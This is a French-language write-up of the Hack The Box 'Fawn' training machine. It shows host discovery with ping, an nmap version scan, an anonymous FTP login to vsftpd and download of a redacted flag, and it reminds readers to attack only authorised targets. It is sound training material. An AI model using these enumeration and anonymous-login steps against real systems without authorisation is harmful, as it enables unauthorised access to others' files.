---
title: "Fawn"
date: 2025-11-24
description: "Une connexion anonyme sur FTP?"
draft: false
featureimage: featured.gif

# Tes taxonomies (correspondant à ton hugo.toml)
tags: ["Misconfiguration", "Protocol", "Nmap", "FTP", "Linux"]
categories: ["Writeups", "Hack The Box", "Starting Point"]
---

# Introduction

**Fawn** est la seconde box du parcours *Starting Point* de [Hack The Box](https://www.hackthebox.com/). C’est une machine tout aussi simple que la machine Meow :

{{< article link="/ravenbreach-blog/writeups/hackthebox/startingpoint/meow/" showSummary=true compactSummary=true >}}

Elle permet de découvrir un autre service potentiellement exploitable durant un pentest. Un walkthrough officiel existe déjà sur HTB si vous voulez un guide pas à pas.

>[!WARNING]
Dans ce ce writeup, je ne publie pas directement le flag final, l’objectif est d’apprendre en pratiquant. Si vous voulez le flag, suivez les étapes sur la machine.

>[!CAUTION]
**NOTE :** n’attaquez que des machines sur lesquelles vous avez l’autorisation (ex. machines HTB, ou lab perso). Respectez les règles de la plateforme.

## Vidéo Walkthrough

Si tu préfères regarder un tuto plutôt que lire, voici ma vidéo :

{{< youtubeLite id="Y32-D6f8HZ4" label="Fawn Walkthrough" >}}

---

## Reconnaissance (Information gathering)

### Découverte d’hôte (Asset discovery)

La première étape, comme toujours, est de vérifier que la machine répond avec la commande ``ping`` suivi de l’**IP** de la cible. Cela permet de confirmer la connectivité réseau.
```bash
┌─[user@parrot]─[~]
└──╼ $ping 10.129.130.0

PING 10.129.130.0 (10.129.130.0) 56(84) bytes of data.
64 bytes from 10.129.130.0: icmp_seq=1 ttl=63 time=16.1 ms
64 bytes from 10.129.130.0: icmp_seq=2 ttl=63 time=15.5 ms
64 bytes from 10.129.130.0: icmp_seq=3 ttl=63 time=14.5 ms
64 bytes from 10.129.130.0: icmp_seq=4 ttl=63 time=15.6 ms
^C
--- 10.129.130.0 ping statistics ---
10 packets transmitted, 9 received, 10% packet loss, time 9035ms
rtt min/avg/max/mdev = 14.459/210.777/1769.368/551.046 ms, pipe 2
```
Quand on obtient des réponses, on peut interrompre la commande avec ``CTRL+C``. Les 4 paquets que nous avons reçue en réponse nous indique bien que la cible est joignable.

### Énumération des services (Service enumeration)

On va scanner les ports pour connaître les services accessibles et leurs versions. ``nmap`` est l’outil standard pour ça. J’utilise le flag ``-sV`` pour la détection de version.

```bash
┌─[user@parrot]─[~]
└──╼ $nmap -sV 10.129.130.0

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-24 18:14 UTC
Nmap scan report for 10.129.130.0
Host is up (0.035s latency).
Not shown: 835 closed tcp ports (conn-refused), 164 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix
```
On voit qu’un seul port est ouvert, le port **21/tcp**. Le service qui tourne dessus est **FTP**. FTP est un **protocole de transfert de fichiers** standard. Il est non chiffré, ce qui signifie que les données transitent en clair. Sur des machines mal configurées, il peut accepter des connexions sans mot de passe (anonymous) ou avec des identifiants par défaut.

---

## Pré-exploitation

### Evaluation de vulnerabilité (Vulnerability Assessment)

Avant d’exploiter quoi que ce soit, on vérifie si une connexion interactive est possible. Ici, on va essayer **ftp 10.129.130.0** pour voir l’écran d’accueil et éventuellement un prompt de login.

```bash
┌─[user@parrot]─[~]
└──╼ $ftp 10.129.130.0

Connected to 10.129.130.0.
220 (vsFTPd 3.0.3)
Name (10.129.130.0:user):
```
Le service présente une invite d’authentification. On va tenter d’exploiter une mauvaise configuration courante en utilisant le compte par défaut ``anonymous`` avec un mot de passe vide.

---

## Exploitation

### Accès initial

On teste donc le compte ``anonymous`` et on appuie juste sur entrée lorsqu’il demande un mot de passe.
```bash
┌─[user@parrot]─[~]
└──╼ $ftp 10.129.130.0

Connected to 10.129.130.0.
220 (vsFTPd 3.0.3)
Name (10.129.130.0:user): anonymous

331 Please specify the password.
Password: 

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
La connexion est validée par le message **230 Login successful**. Une fois l’accès obtenu, nous utilisons la commande ``ls`` pour explorer l’arborescence et identifier d’éventuels fichiers sensibles.
```bash
ftp> ls

229 Entering Extended Passive Mode (|||25853|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
```
L’énumération révèle la présence d’un fichier nommé **flag.txt**. Il s’agit très probablement de notre objectif. Nous utilisons donc la commande ``get`` pour le télécharger sur notre machine locale.
```bash
ftp> get flag.txt

local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||38281|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |***********************************|    32        9.52 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (1.75 KiB/s)
```
On peut du coup fermer la connexion ftp avec la commande **exit**.
```bash
ftp> exit

221 Goodbye.
```

---

## Post-Exploitation

Le téléchargement terminé, nous vérifions la présence du fichier en local en listant le contenu du répertoire courant avec la commande ``ls``.
```bash
┌─[user@parrot]─[~]
└──╼ $ls

Desktop    Downloads  Pictures  Templates  flag.txt
Documents  Music      Public    Videos
```
Le fichier est bien présent. Il ne reste plus qu’à utiliser ``cat`` pour en afficher le contenu et valider le flag.

```bash
┌─[user@parrot]─[~]
└──╼ $cat flag.txt

035{...hidden..}815
```

La machine est ***pwned*** !

<!-- ---

## Pour aller plus loin

### Script automatisé
Ce n'est pas encore fait mais je prévois de faire un script automatisé !

### Rapport professionnel
Ce n'est pas encore fait mais je prévois de faire un rapport professionnel ! -->
